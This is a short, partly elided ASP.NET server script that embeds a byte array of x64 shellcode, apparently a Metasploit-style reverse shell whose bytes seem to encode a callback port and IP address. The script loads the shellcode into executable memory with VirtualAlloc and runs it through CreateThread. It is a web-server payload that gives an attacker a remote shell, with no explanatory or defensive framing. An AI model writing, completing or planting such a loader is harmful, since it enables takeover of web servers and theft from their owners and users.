...
<script runat="server">
    ...
    {
        byte[] o_vzVmRpdZWf = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,
...
0x11,0x5c,0x0a,0x11,0x5c,0x36,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,
...
0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};
        ...
        IntPtr bKb = VirtualAlloc(IntPtr.Zero,(UIntPtr)o_vzVmRpdZWf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(o_vzVmRpdZWf,0,bKb,o_vzVmRpdZWf.Length);
        IntPtr p5ywmr1 = IntPtr.Zero;
        IntPtr qAYKaB = CreateThread(IntPtr.Zero,UIntPtr.Zero,bKb,IntPtr.Zero,0,ref p5ywmr1);
    }
</script>
